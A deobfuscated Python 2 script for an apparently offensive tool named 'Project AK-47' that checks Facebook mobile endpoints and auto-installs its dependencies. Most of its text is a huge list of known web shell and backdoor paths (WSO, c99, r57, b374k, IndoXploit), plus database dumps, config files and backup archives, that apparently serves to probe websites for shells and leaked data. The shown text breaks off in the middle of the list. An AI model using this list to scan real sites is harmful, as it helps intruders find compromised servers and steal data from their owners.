# Deobfuscated BY HTR-TECH | Tahmid Rayat

# Github    : https://github.com/htr-tech 
# Instagram : https://www.instagram.com/tahmid.rayat
# Facebook  : https://fb.com/tahmid.rayat.oficial 
# Messenger : https://m.me/tahmid.rayat.oficial 



import os, sys, base64, random, hashlib, time, json, re
from multiprocessing.pool import ThreadPool
from multiprocessing import *
W = '\x1b[1;37m'
N = '\x1b[0m'
R = '\x1b[1;37m\x1b[31m'
B = '\x1b[1;37m\x1b[34m'
G = '\x1b[1;32m'
Y = '\x1b[1;33;40m'
SR = W + '[' + R + '*' + W + ']'
SG = W + '[' + G + '*' + W + ']'
SRO = W + '(' + R + '>' + W + ')'
SGO = W + '(' + G + '>' + W + ')'
xin = '\n'
SBG = '\x1b[1;37m(\x1b[1;32m\xe2\x97\x8f\x1b[1;37m)'
SBR = '\x1b[1;37m(\x1b[1;37m\x1b[31m\xe2\x97\x8f\x1b[1;37m)'
bannerm = [
 ('\n   {}      ,{}\n         \\ , , /\n         (\xd2\x82{}\xc2\xb0{}_{}\xc2\xb0{}){}      Project AK-47\n   {}         <,,{}\xef\xb8\xbb\xe2\x95\xa6\xe2\x95\xa4\xe2\x94\x80 {}\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb{}\xc2\xbb \xd2\x89 {}\n         _/\xef\xb9\x8b\\___\n').format(G, W, G, W, G, W, W, W, R, Y, R, W)]
banner = [
 ('\n   {}      ,{}      Inspired from ASU By Deray\n         \\ , , /\n         (\xd2\x82{}\xc2\xb0{}_{}\xc2\xb0{}){}     Project-AK-47\n   {}      <,,{}\xef\xb8\xbb\xe2\x95\xa6\xe2\x95\xa4\xe2\x94\x80 {}\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb{}\xc2\xbb \xd2\x89 {}  V1.0{}\n         _/\xef\xb9\x8b\\___  Dev : Nasir Ali\n').format(G, W, G, W, G, W, W, W, R, Y, R, G, W)]
procx = ThreadPool(int(cpu_count()) * 5)
os.system('clear')

def funx(word):
    lix = [
     '/', '-', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}.. {}').format(str(word), lix[x]))
            time.sleep(0.3)
            sys.stdout.flush()


if int(sys.version[0]) != 2:
    sys.stdout.write("It's Python2 Script \n use python2 ")
    sys.exit()
try:
    from requests import *
    from bs4 import *
    import requests
    print xin + SGO + G + ' Requirements Available'
except:
    print xin + SRO + R + 'Installing Requirements......'
    os.system('pip2 install requests')
    os.system('pip2 install bs4')
    from requests import *
    from bs4 import *
    import requests
    os.system('clear')

s = Session()
headers = {'Accept-Language': 'en-US,en;q=0.5'}
url = 'https://free.facebook.com{}'
funx(SG + Y + ' Checking For Free-Facebook Support')
try:
    if get('https://free.facebook.com', allow_redirects=False).status_code != 200:
        print xin + SR + R + ' Free Facebook Not Supported:('
        url = 'https://mbasic.facebook.com{}'
    else:
        print xin + SG + G + ' Free Facebook Mode Available :)'
except:
    print xin + SR + R + ' No Internet Connection:('
    sys.exit()

shellp = '/wso.php\n/wso-2.5.php\n/deray.txt\n/wos.php?login=wos\n/1945.php?login=1945\n/wos.php\n/1945.php\n/45.php\n/cc.php\n/ls.php\n/system.php\n/cmd.php\n/rootx.php\n/adminer.php\n/jkt48_1.php\n/indonesia.php\n/php.php\n/b374k.php\n/1n73ction.php\n/shell.php\n/sh3ll.php\n/root.php\n/bh.php\n/sbh.php\n/idca.php\n/indoxploit.php\n/indoxploit_shell.php\n/idca_shell.php\n/bejak.php\n/injection.php\n/gaza.php\n/andela.php\n/jkt48.php\n/backdoor.php\n/backd00r.php\n/1337.php\n/komet.php\n/bekdur.php\n/bd.php\n/arab.php\n/xxx.php\n/c99.php\n/r57.php\n/webadmin.php\n/data.php\n/konten.php\n/kamu.php\n/iya.php\n/koe.php\n/gca.php\n/sj.php\n/shell.asp\n/R57.php\n/C99.php\n/inject.php\n/kdoor.php\n/index.php\n/o.php\n/mosok.php\n/v.php\n/i.php\n/a.php\n/s.php\n/ap.php\n/you.php\n/1.php\n/2.php\n/3.php\n/4.php\n/5.php\n/6.php\n/7.php\n/8.php\n/9.php\n/10.php\nb.php\nr.php\ns.php\nu.php\ny.php\nk.php\nl.php\ni.php\no.php\nm.php\nj.php\nc.php\nz.php\nq.php\ne.php\nw.php\nt.php\nr.php\nf.php\nd.php\nok.php\n1.php\n2.php\n3.php\n4.php\n5.php\n7.php\n6.php\n8.php\n9.php\n0.php\n00.php\nherp.php\nnptice.php\ntuyul.php\nnikung.php\ntertykung.php\ncodrs.php\njingan.php\nchan.php\nkntl.php\nlosX.php\nmom.php\nsad.php\nuploads/ok.php\nupload/ok.php\nupload/up.php\nupload/shell.php\nupload/idx.php\nupload/ind.php\nupload/v.php\nupload/sym.php\nupload/gallers.php\nupload/bekdur.php\nupload/file/up.php\nupload/file/wso.php\nupload/file/test.php\nupload/file/WSO.php\nupload/file/123.php\nupload/file/uploader.php\nupload/file/upload.php\nupload/file/zero.php\nupload/file/ups.php\nupload/file/tmp.php\nupload/file/jump.php\nupload/file/x.php\nupload/file/X.php\nupload/file/idx.php\nupload/file/b3ca7k.php\nupload/file/indo.php\nupload/file/asu.php\nupload/file/dhanush.php\nupload/file/aaa.php\nupload/file/az.php\nupload/file/xxx.php\nupload/file/curl.php\nupload/file/root.php\nupload/file/asu.php\nupload/file/id.php\nupload/file/minishell.php\nupload/file/kill.php\nupload/file/0.php\nupload/file/alone.php\nupload/file/hex.php\nupload/file/500.php\nupload/file/error.php\nupload/file/406.php\nupload/file/fuck.php\nupload/file/zzz.php\nimages/WSO.php\nimages/dz.php\nimages/DZ.php\nimages/cpanel.php\nimages/cpn.php\nimages/sos.php\nimages/term.php\nimages/Sec-War.php\nimages/sql.php\nimages/ssl.php\nimages/mysql.php\nimages/WolF.php\nimages/madspot.php\nimages/Cgishell.pl\nimages/killer.php\nimages/changeall.php\nimages/2.php\nimages/Sh3ll.php\nimages/dz0.php\nimages/dam.php\nimages/user.php\nimages/dom.php\nimages/whmcs.php\nimages/vb.zip\nimages/sa.php\nimages/sysadmins/\nimages/admin1/\nimages/sniper.php\nimages/images/Sym.php\nimages//r57.php\nimages/gzaa_spysl\nimages/sql-new.php\nimages/shell.php\nimages/sa.php\nimages/admin.php\nimages/sa2.php\nimages/2.php\nimages/user.txt\nimages/site.txt\nimages/error_log\nimages/error\nimages/site.sql\nimages/vb.sql\nimages/forum.sql\nimages/r00t-s3c.php\nimages/c.php\nimages/backup.sql\nimages/back.sql\nimages/data.sql\nimages/tmp/vaga.php\nimages/tmp/killer.php\nimages/whmcs.php\nimages/abuhlail.php\nimages/tmp/killer.php\nimages/tmp/domaine.pl\nimages/tmp/domaine.php\nimages/useradmin/\nimages/tmp/d0maine.php\nimages/d0maine.php\nimages/tmp/sql.php\nimages/X.php\nimages/123.php\nimages/m.php\nimages/b.php\nimages/up.php\nimages/tmp/dz1.php\nimages/dz1.php\nimages/Symlink.php\nimages/Symlink.pl\nimages/joomla.zip\nimages/wp.php\nimages/buck.sql\nincludes/WSO.php\nincludes/dz.php\nincludes/DZ.php\nincludes/cpanel.php\nincludes/cpn.php\nincludes/sos.php\nincludes/term.php\nincludes/Sec-War.php\nincludes/sql.php\nincludes/ssl.php\nincludes/mysql.php\nincludes/WolF.php\nincludes/madspot.php\nincludes/Cgishell.pl\nincludes/killer.php\nincludes/changeall.php\nincludes/2.php\nincludes/Sh3ll.php\nincludes/dz0.php\nincludes/dam.php\nincludes/user.php\nincludes/dom.php\nincludes/whmcs.php\nincludes/vb.zip\nincludes/r00t.php\nincludes/c99.php\nincludes/gaza.php\nincludes/1.php\nincludes/d0mains.php\nincludes/madspotshell.php\nincludes/info.php\nincludes/egyshell.php\nincludes/Sym.php\nincludes/c22.php\nincludes/c100.php\nincludes/configuration.php\nincludes/g.php\nincludes/xx.pl\nincludes/ls.php\nincludes/Cpanel.php\nincludes/k.php\nincludes/zone-h.php\nincludes/tmp/user.php\nincludes/tmp/Sym.php\nincludes/cp.php\nincludes/tmp/madspotshell.php\nincludes/tmp/root.php\nincludes/tmp/whmcs.php\nincludes/tmp/index.php\nincludes/tmp/2.php\nincludes/tmp/dz.php\nincludes/tmp/cpn.php\nincludes/tmp/changeall.php\nincludes/tmp/Cgishell.pl\nincludes/tmp/sql.php\nincludes/0day.php\nincludes/tmp/admin.php\nincludes/L3b.php\nincludes/d.php\nincludes/tmp/d.php\nincludes/tmp/L3b.php\nincludes/sado.php\nincludes/admin1.php\nincludes/upload.php\nincludes/up.php\nincludes/vb.zip\nincludes/vb.rar\nincludes/admin2.asp\nincludes/uploads.php\nincludes/sa.php\nincludes/sysadmins/\nincludes/admin1/\nincludes/sniper.php\nincludes/images/Sym.php\nincludes//r57.php\nincludes/gzaa_spysl\nincludes/sql-new.php\nincludes//shell.php\nincludes//sa.php\nincludes//admin.php\nincludes//sa2.php\nincludes//2.php\nincludes//gaza.php\nincludes//up.php\nincludes//upload.php\nincludes//uploads.php\nincludes/shell.php\nincludes//amad.php\nincludes//t00.php\nincludes//dz.php\nincludes//site.rar\nincludes//Black.php\nincludes//site.tar.gz\nincludes//home.zip\nincludes//home.rar\nincludes//home.tar\nincludes//home.tar.gz\nincludes//forum.zip\nincludes//forum.rar\nincludes//forum.tar\nincludes//forum.tar.gz\nincludes//test.txt\nincludes//ftp.txt\nincludes//user.txt\nincludes//site.txt\nincludes//error_log\nincludes//error\nincludes//cpanel\nincludes//awstats\nincludes//site.sql\nincludes//vb.sql\nincludes//forum.sql\nincludes/r00t-s3c.php\nincludes/c.php\nincludes//backup.sql\nincludes//back.sql\nincludes//data.sql\nincludes/wp.rar/\nincludes/asp.aspx\nincludes/tmp/vaga.php\nincludes/tmp/killer.php\nincludes/whmcs.php\nincludes/abuhlail.php\nincludes/tmp/killer.php\nincludes/tmp/domaine.pl\nincludes/tmp/domaine.php\nincludes/useradmin/\nincludes/tmp/d0maine.php\nincludes/d0maine.php\nincludes/tmp/sql.php\nincludes/X.php\nincludes/123.php\nincludes/m.php\nincludes/b.php\nincludes/up.php\nincludes/tmp/dz1.php\nincludes/dz1.php\nincludes/forum.zip\nincludes/Symlink.php\nincludes/Symlink.pl\nincludes/joomla.zip\nincludes/joomla.rar\nincludes/wp.php\nincludes/buck.sql\nincludes/sysadmin.php\nincludes/images/c99.php\nincludes/xd.php\nincludes/c100.php\nincludes/spy.aspx\nincludes/xd.php\nincludes/tmp/xd.php\nincludes/sym/root/home/\nincludes/billing/killer.php\nincludes/tmp/upload.php\nincludes/tmp/admin.php\nincludes/Server.php\nincludes/tmp/uploads.php\nincludes/tmp/up.php\nincludes/Server/\nincludes/wp-admin/c99.php\nincludes/tmp/priv8.php\nincludes/priv8.php\nincludes/cgi.pl/\nincludes/tmp/cgi.pl\nincludes/downloads/dom.php\nincludes/webadmin.html\nincludes/admins.php\nincludes/bluff.php\nincludes/king.jeen\nincludes/admins/\nincludes/admins.asp\nincludes/admins.php\nincludes/wp.zip\nincludes/\nupload.php\nadmin/upload.php\nshell.php\nup.php\nuploader.php\na.php\n123.php\ntest.php\nminishell.php\n0.php\nwso.php\nerror_log\ntools.php\nr00t.php\nadmin/error_log\naccess_log\nphpinfo.php\ninfo.php\nxxx.php\nindo.php\nidx.php\nsym.py\ndir/\nlib/\ntmp/\nincludes/\nlog/error_log\nlog/error.log\nlog/www-error.log\ninclude/\nScripts/\ntest/\nsym/root/home/\nchonx_sym/\nchonx_root/\nweb/\nupload/\nimages/\nimg/\ninc/\njs/\nphp/\nsymlink/\nsym/\nidx_config/\nconfig/\nLog/\ncox_config/\nsym_config/\nnoname_config/\nidx_symconf/\nsymconf/\nroot/\nfile/\nfiles/\nconfig.txt\nasu.php\nindex.php\nindex.php/?login\ndb.php\nREADME.txt\ninclude/config.php\nconfig.php\nlogs\nindoxploit.php\nindex1.php\nindex.html\nsh3ll.php\nup.html\nscript.php\nfuck.php\ndir.php\n406.php\n403.php\n500.php\naccounts.php\nbekdur.php\nnotfound.php\nnot_acceptable.php\n1337.php\n1n73ct10n.php\nb374k.php\nadmin_home.php\nhome_admin.php\nshell.php\nzeeb.php\ndz.php\nxd.php\nimages/up.php\nimages/upload.php\nfiles/up.php\nfile/upload.php\nfiles/shell.php\nfiles/uploader.php\nfiles/indexx.php\nfile/up.php\nfile/uplod.php\nfile/wso.php\nfile/idx.php\nfile/up1.php\n13.php\nkiller.php\nSh3ll.php\nnew.php\nSym.php\ndom.php\nzero.php\npriv8.php\njembut.php\nv4ga.php\nbackup.zip\ns3c.php\nmadspotshell.php\nsa.php\nx.php\nnoname.php\nkntol.php\nWSO.php\nIndoXploit.php\nbajingan.php\nc99.php\nX.php\nGood.php\npas.phtml\npas.php\nabc.php\nindexx.php\nbrowse.php\nup1.php\nhaha.php\nz.php\ngaza.php\nsc.php\n1234.php\nfvck.php\nerror.php\n0x.php\nup.php5\nshell.php5\ninc/config.php\nix.php\n-.php\nid.php\nr0x.php\nbn.php\ndm.php\ngator.php\nmail.php\nmailer.php\nperlcgi.pl\nphp.ini\nmodul.php\nwso1.php\nwp.php\nconfiguration.php\nc.php\ntai.php\nroot.php\nwww.php\nx13.php\nntaps.php\ntools.php\nzip.php\n@.php\nea.php\naaaa.php\ncinfo.php\nby.php\nceleng.php\njmbt.php\nnewfile.php\nmaho.php\nmia.php\npro.php\nqwe.php\nshell_finder.php\n11.php\ncfinder.php\ntitle.php\nedit.php\ns.php\nwp.zip\nxmlrpc.php\npasired.php\npass.php\nadm.php\nadminer.php\nCpanel.php\ncpanel.php\nnoob.php\n..php\nb2.php\nlol.php\nLol.php\ndhanush.php\nasw.php\nmini.php5\nler.php\ndef.php\nex.php\nnoname.php\nunknown.php\nanon.php\nsel.php\nextremecrw.php\nindx.php\n14.php\n6.php\nangel.php\nbv7binary.php\nc100.php\nr57.php\nwebroot.php\nh4cker.php\ngazashell.php\nlocus7shell.php\nsyrianshell.php\ninjection.php\ncyberwarrior.php\nernebypass.php\ng6shell.php\npouyaserver.php\nsaudishell.php\nsimattacker.php\nsosyeteshell.php\ntryagshell.php\nuploadshell.php\nwsoshell.php\nzehir4shell.php\nlostdcshell.php\ncommandshell.php\nmailershell.php\ncwshell.php\niranshell.php\nindishell.php\ng6sshell.php\nsqlshell.php\nsimshell.php\ntryagshell.php\nzehirshell.php\nk2ll33d.php\nb1n4ry.php\n12.php\ndefault.php\nblank.php\n/index.php?option=com_fabrik&amp;c=import&amp;view=import&amp;filetype=csv&amp;tableid=1echercher\n/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1\n/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/php/connector.php\n/wp-content/plugins/disqus-comment-system/disqus.php\n/d0mains.php\n/wp-content/plugins/akismet/akismet.php\n/madspotshell.php\n/info.php\n/egyshell.php\n/Sym.php\n/c22.php\n/c100.php\n/wp-content/plugins/akismet/admin.php\n/configuration.php\n/g.php\n/wp-content/plugins/google-sitemap-generator/sitemap-core.php\n/wp-content/plugins/akismet/widget.php\n/xx.pl\n/ls.php\n/Cpanel.php\n/k.php\n/zone-h.php\n/tmp/user.php\n/tmp/Sym.php\n/cp.php\n/tmp/madspotshell.php\n/tmp/root.php\n/tmp/whmcs.php\n/tmp/index.php\n/tmp/2.php\n/tmp/dz.php\n/tmp/cpn.php\n/tmp/changeall.php\n/tmp/Cgishell.pl\n/tmp/sql.php\n/0day.php\n/tmp/admin.php\n/cliente/downloads/h4xor.php\n/whmcs/downloads/dz.php\n/L3b.php\n/d.php\n/tmp/d.php\n/tmp/L3b.php\n/wp-content/plugins/akismet/admin.php\n/templates/rhuk_milkyway/index.php\n/templates/beez/index.php\n/sado.php\n/admin1.php\n/upload.php\n/up.php\n/vb.zip\n/vb.rar\n/admin2.asp\n/uploads.php\n/sa.php\n/sysadmins/\n/admin1/\n/sniper.php\n/administration/Sym.php\nimages/Sym.php\n/r57.php\n/wp-content/plugins/disqus-comment-system/disqus.php\ngzaa_spysl\nsql-new.php\n/shell.php\n/sa.php\n/admin.php\n/sa2.php\n/2.php\n/gaza.php\n/up.php\n/upload.php\n/uploads.php\n/templates/beez/index.php\nshell.php\n/amad.php\n/t00.php\n/dz.php\n/site.rar\n/Black.php\n/site.tar.gz\n/home.zip\n/home.rar\n/home.tar\n/home.tar.gz\n/forum.zip\n/forum.rar\n/forum.tar\n/forum.tar.gz\n/test.txt\n/ftp.txt\n/user.txt\n/site.txt\n/error_log\n/error\n/cpanel\n/awstats\n/site.sql\n/vb.sql\n/forum.sql\nr00t-s3c.php\nc.php\n/backup.sql\n/back.sql\n/data.sql\nwp.rar/\nwp-content/plugins/disqus-comment-system/disqus.php\nasp.aspx\n/templates/beez/index.php\n/tmp/vaga.php\n/tmp/killer.php\n/whmcs.php\nabuhlail.php\n/tmp/killer.php\n/tmp/domaine.pl\n/tmp/domaine.php\n/useradmin/\n/tmp/d0maine.php\n/d0maine.php\n/tmp/sql.php\n/X.php\n/123.php\n/m.php\n/b.php\n/up.php\n/tmp/dz1.php\n/dz1.php\n/forum.zip\n/Symlink.php\n/Symlink.pl\n/forum.rar\n/joomla.zip\n/joomla.rar\n/wp.php\n/buck.sql\n/sysadmin.php\n/images/c99.php\n/xd.php\n/c100.php\n/spy.aspx\n/xd.php\n/tmp/xd.php\n/sym/root/home/\n/billing/killer.php\n/tmp/upload.php\n/tmp/admin.php\n/Server.php\n/tmp/uploads.php\n/tmp/up.php\n/Server/\n/wp-admin/c99.php\n/tmp/priv8.php\npriv8.php\ncgi.pl/\n/tmp/cgi.pl\n/downloads/dom.php\n/templates/ja-helio-farsi/index.php\n/webadmin.html\n/admins.php\n/wp-content/plugins/count-per-day/js/yc/d00.php\n/bluff.php\n/king.jeen\n/admins/\n/admins.asp\n/admins.php\n/templates/beez/dz.php\n/templates/beez/DZ.php\n/templates/beez/cpn.php\n/templates/beez/sos.php\n/templates/beez/term.php\n/templates/beez/Sec-War.php\n/templates/beez/sql.php\n/templates/beez/ssl.php\n/templates/beez/mysql.php\n/templates/beez/WolF.php\n/templates/beez/configuration.php\n/templates/beez/g.php\n/templates/beez/xx.pl\n/templates/beez/ls.php\n/templates/beez/Cpanel.php\n/templates/beez/k.php\n/templates/beez/zone-h.php\n/templates/beez/tmp/user.php\n/templates/beez/tmp/Sym.php\n/templates/beez/cp.php\n/templates/beez/tmp/madspotshell.php\n/templates/beez/tmp/root.php\n/templates/beez/tmp/whmcs.php\n/templates/beez/tmp/index.php\n/templates/beez/tmp/2.php\n/templates/beez/tmp/dz.php\n/templates/beez/tmp/cpn.php\n/templates/beez/tmp/changeall.php\n/templates/beez/tmp/Cgishell.pl\n/templates/beez/tmp/sql.php\n/templates/beez/0day.php\n/templates/beez/tmp/admin.php\n/templates/beez/L3b.php\n/templates/beez/d.php\n/templates/beez/tmp/d.php\n/templates/beez/tmp/L3b.php\n/templates/beez/sado.php\n/templates/beez/admin1.php\n/templates/beez/upload.php\n/templates/beez/up.php\n/templates/beez/vb.zip\n/templates/beez/vb.rar\n/templates/beez/admin2.asp\n/templates/beez/uploads.php\n/templates/beez/sa.php\n/templates/beez/sysadmins/\n/templates/beez/admin1/\n/templates/beez/sniper.php\n/templates/beez/images/Sym.php\n/templates/beez//r57.php\n/templates/beez/gzaa_spysl\n/templates/beez/sql-new.php\n/templates/beez//shell.php\n/templates/beez//sa.php\n/templates/beez//admin.php\n/templates/beez//sa2.php\n/templates/beez//2.php\n/templates/beez//gaza.php\n/templates/beez//up.php\n/templates/beez//upload.php\n/templates/beez//uploads.php\n/templates/beez/shell.php\n/templates/beez//amad.php\n/templates/beez//t00.php\n/templates/beez//dz.php\n/templates/beez//site.rar\n/templates/beez//Black.php\n/templates/beez//site.tar.gz\n/templates/beez//home.zip\n/templates/beez//home.rar\n/templates/beez//home.tar\n/templates/beez//home.tar.gz\n/templates/beez//forum.zip\n/templates/beez//forum.rar\n/templates/beez//forum.tar\n/templates/beez//forum.tar.gz\n/templates/beez//test.txt\n/templates/beez//ftp.txt\n/templates/beez//user.txt\n/templates/beez//site.txt\n/templates/beez//error_log\n/templates/beez//error\n/templates/beez//cpanel\n/templates/beez//awstats\n/templates/beez//site.sql\n/templates/beez//vb.sql\n/templates/beez//forum.sql\n/templates/beez/r00t-s3c.php\n/templates/beez/c.php\n/templates/beez//backup.sql\n/templates/beez//back.sql\n/templates/beez//data.sql\n/templates/beez/wp.rar/\n/templates/beez/asp.aspx\n/templates/beez/tmp/vaga.php\n/templates/beez/tmp/killer.php\n/templates/beez/whmcs.php\n/templates/beez/abuhlail.php\n/templates/beez/tmp/killer.php\n/templates/beez/tmp/domaine.pl\n/templates/beez/tmp/domaine.php\n/templates/beez/useradmin/\n/templates/beez/tmp/d0maine.php\n/templates/beez/d0maine.php\n/templates/beez/tmp/sql.php\n/templates/beez/X.php\n/templates/beez/123.php\n/templates/beez/m.php\n/templates/beez/b.php\n/templates/beez/up.php\n/templates/beez/tmp/dz1.php\n/templates/beez/dz1.php\n/templates/beez/forum.zip\n/templates/beez/Symlink.php\n/templates/beez/Symlink.pl\n/templates/beez/forum.rar\n/templates/beez/joomla.zip\n/templates/beez/joomla.rar\n/templates/beez/wp.php\n/templates/beez/buck.sql\n/templates/beez/sysadmin.php\n/templates/beez/images/c99.php\n/templates/beez/xd.php\n/templates/beez/c100.php\n/templates/beez/spy.aspx\n/templates/beez/xd.php\n/templates/beez/tmp/xd.php\n/templates/beez/sym/root/home/\n/templates/beez/billing/killer.php\n/templates/beez/tmp/upload.php\n/templates/beez/tmp/admin.php\n/templates/beez/Server.php\n/templates/beez/tmp/uploads.php\n/templates/beez/tmp/up.php\n/templates/beez/Server/\n/templates/beez/wp-admin/c99.php\n/templates/beez/tmp/priv8.php\n/templates/beez/priv8.php\n/templates/beez/cgi.pl/\n/templates/beez/tmp/cgi.pl\n/templates/beez/downloads/dom.php\n/templates/beez/webadmin.html\n/templates/beez/admins.php\n/templates/beez/bluff.php\n/templates/beez/king.jeen\n/templates/beez/admins/\n/templates/beez/admins.asp\n/templates/beez/admins.php\n/templates/beez/wp.zip\n/templates/beez/index.php\n/images/WSO.php\n/images/dz.php\n/images/DZ.php\n/images/cpanel.php\n/images/cpn.php\n/images/sos.php\n/images/term.php\n/images/Sec-War.php\n/images/sql.php\n/images/ssl.php\n/images/mysql.php\n/images/WolF.php\n/images/madspot.php\n/images/Cgishell.pl\n/images/killer.php\n/images/changeall.php\n/images/2.php\n/images/Sh3ll.php\n/images/dz0.php\n/images/dam.php\n/images/user.php\n/images/dom.php\n/images/whmcs.php\n/images/vb.zip\n/images/sa.php\n/images/sysadmins/\n/images/admin1/\n/images/sniper.php\n/images/images/Sym.php\n/images//r57.php\n/images/gzaa_spysl\n/images/sql-new.php\n/images//shell.php\n/images//sa.php\n/images//admin.php\n/images//sa2.php\n/images//2.php\n/images//user.txt\n/images//site.txt\n/images//error_log\n/images//error\n/images//cpanel\n/images//awstats\n/images//site.sql\n/images//vb.sql\n/images//forum.sql\n/images/r00t-s3c.php\n/images/c.php\n/images//backup.sql\n/images//back.sql\n/images//data.sql\n/images/wp.rar/\n/images/asp.aspx\n/images/tmp/vaga.php\n/images/tmp/killer.php\n/images/whmcs.php\n/images/abuhlail.php\n/images/tmp/killer.php\n/images/tmp/domaine.pl\n/images/tmp/domaine.php\n/images/useradmin/\n/images/tmp/d0maine.php\n/images/d0maine.php\n/images/tmp/sql.php\n/images/X.php\n/images/123.php\n/images/m.php\n/images/b.php\n/images/up.php\n/images/tmp/dz1.php\n/images/dz1.php\n/images/forum.zip\n/images/Symlink.php\n/images/Symlink.pl\n/images/forum.rar\n/images/joomla.zip\n/images/joomla.rar\n/images/wp.php\n/images/buck.sql\n/includes/WSO.php\n/includes/dz.php\n/includes/DZ.php\n/includes/cpanel.php\n/includes/cpn.php\n/includes/sos.php\n/includes/term.php\n/includes/Sec-War.php\n/includes/sql.php\n/includes/ssl.php\n/includes/mysql.php\n/includes/WolF.php\n/includes/madspot.php\n/includes/Cgishell.pl\n/includes/killer.php\n/includes/changeall.php\n/includes/2.php\n/includes/Sh3ll.php\n/includes/dz0.php\n/includes/dam.php\n/includes/user.php\n/includes/dom.php\n/includes/whmcs.php\n/includes/vb.zip\n/includes/r00t.php\n/includes/c99.php\n/includes/gaza.php\n/includes/1.php\n/includes/d0mains.php\n/includes/madspotshell.php\n/includes/info.php\n/includes/egyshell.php\n/includes/Sym.php\n/includes/c22.php\n/includes/c100.php\n/includes/configuration.php\n/includes/g.php\n/includes/xx.pl\n/includes/ls.php\n/includes/Cpanel.php\n/includes/k.php\n/includes/zone-h.php\n/includes/tmp/user.php\n/includes/tmp/Sym.php\n/includes/cp.php\n/includes/tmp/madspotshell.php\n/includes/tmp/root.php\n/includes/tmp/whmcs.php\n/includes/tmp/index.php\n/includes/tmp/2.php\n/includes/tmp/dz.php\n/includes/tmp/cpn.php\n/includes/tmp/changeall.php\n/includes/tmp/Cgishell.pl\n/includes/tmp/sql.php\n/includes/0day.php\n/includes/tmp/admin.php\n/includes/L3b.php\n/includes/d.php\n/includes/tmp/d.php\n/includes/tmp/L3b.php\n/includes/sado.php\n/includes/admin1.php\n/includes/upload.php\n/includes/up.php\n/includes/vb.zip\n/includes/vb.rar\n/includes/admin2.asp\n/includes/uploads.php\n/includes/sa.php\n/includes/sysadmins/\n/includes/admin1/\n/includes/sniper.php\n/includes/images/Sym.php\n/includes//r57.php\n/includes/gzaa_spysl\n/includes/sql-new.php\n/includes//shell.php\n/includes//sa.php\n/includes//admin.php\n/includes//sa2.php\n/includes//2.php\n/includes//gaza.php\n/includes//up.php\n/includes//upload.php\n/includes//uploads.php\n/includes/shell.php\n/includes//amad.php\n/includes//t00.php\n/includes//dz.php\n/includes//site.rar\n/includes//Black.php\n/includes//site.tar.gz\n/includes//home.zip\n/includes//home.rar\n/includes//home.tar\n/includes//home.tar.gz\n/includes//forum.zip\n/includes//forum.rar\n/includes//forum.tar\n/includes//forum.tar.gz\n/includes//test.txt\n/includes//ftp.txt\n/includes//user.txt\n/includes//site.txt\n/includes//error_log\n/includes//error\n/includes//cpanel\n/includes//awstats\n/includes//site.sql\n/includes//vb.sql\n/includes//forum.sql\n/includes/r00t-s3c.php\n/includes/c.php\n/includes//backup.sql\n/includes//back.sql\n/includes//data.sql\n/includes/wp.rar/\n/includes/asp.aspx\n/includes/tmp/vaga.php\n/includes/tmp/killer.php\n/includes/whmcs.php\n/includes/abuhlail.php\n/includes/tmp/killer.php\n/includes/tmp/domaine.pl\n/includes/tmp/domaine.php\n/includes/useradmin/\n/includes/tmp/d0maine.php\n/includes/d0maine.php\n/includes/tmp/sql.php\n/includes/X.php\n/includes/123.php\n/includes/m.php\n/includes/b.php\n/includes/up.php\n/includes/tmp/dz1.php\n/includes/dz1.php\n/includes/forum.zip\n/includes/Symlink.php\n/includes/Symlink.pl\n/includes/forum.rar\n/includes/joomla.zip\n/includes/joomla.rar\n/includes/wp.php\n/includes/buck.sql\n/includes/sysadmin.php\n/includes/images/c99.php\n/includes/xd.php\n/includes/c100.php\n/includes/spy.aspx\n/includes/xd.php\n/includes/tmp/xd.php\n/includes/sym/root/home/\n/includes/billing/killer.php\n/includes/tmp/upload.php\n/includes/tmp/admin.php\n/includes/Server.php\n/includes/tmp/uploads.php\n/includes/tmp/up.php\n/includes/Server/\n/includes/wp-admin/c99.php\n/includes/tmp/priv8.php\n/includes/priv8.php\n/includes/cgi.pl/\n/includes/tmp/cgi.pl\n/includes/downloads/dom.php\n/includes/webadmin.html\n/includes/admins.php\n/includes/bluff.php\n/includes/king.jeen\n/includes/admins/\n/includes/admins.asp\n/includes/admins.php\n/includes/wp.zip\n/includes/\n/templates/rhuk_milkyway/WSO.php\n/templates/rhuk_milkyway/dz.php\n/templates/rhuk_milkyway/DZ.php\n/templates/rhuk_milkyway/cpanel.php\n/templates/rhuk_milkyway/cpn.php\n/templates/rhuk_milkyway/sos.php\n/templates/rhuk_milkyway/term.php\n/templates/rhuk_milkyway/Sec-War.php\n/templates/rhuk_milkyway/sql.php\n/templates/rhuk_milkyway/ssl.php\n/templates/rhuk_milkyway/mysql.php\n/templates/rhuk_milkyway/WolF.php\n/templates/rhuk_milkyway/madspot.php\n/templates/rhuk_milkyway/Cgishell.pl\n/templates/rhuk_milkyway/killer.php\n/templates/rhuk_milkyway/changeall.php\n/templates/rhuk_milkyway/2.php\n/templates/rhuk_milkyway/Sh3ll.php\n/templates/rhuk_milkyway/dz0.php\n/templates/rhuk_milkyway/dam.php\n/templates/rhuk_milkyway/user.php\n/templates/rhuk_milkyway/dom.php\n/templates/rhuk_milkyway/whmcs.php\n/templates/rhuk_milkyway/vb.zip\n/templates/rhuk_milkyway/r00t.php\n/templates/rhuk_milkyway/c99.php\n/templates/rhuk_milkyway/gaza.php\n/templates/rhuk_milkyway/1.php\n/templates/rhuk_milkyway/d0mains.php\n/templates/rhuk_milkyway/madspotshell.php\n/templates/rhuk_milkyway/info.php\n/templates/rhuk_milkyway/egyshell.php\n/templates/rhuk_milkyway/Sym.php\n/templates/rhuk_milkyway/c22.php\n/templates/rhuk_milkyway/c100.php\n/templates/rhuk_milkyway/configuration.php\n/templates/rhuk_milkyway/g.php\n/templates/rhuk_milkyway/xx.pl\n/templates/rhuk_milkyway/ls.php\n/templates/rhuk_milkyway/Cpanel.php\n/templates/rhuk_milkyway/k.php\n/templates/rhuk_milkyway/zone-h.php\n/templates/rhuk_m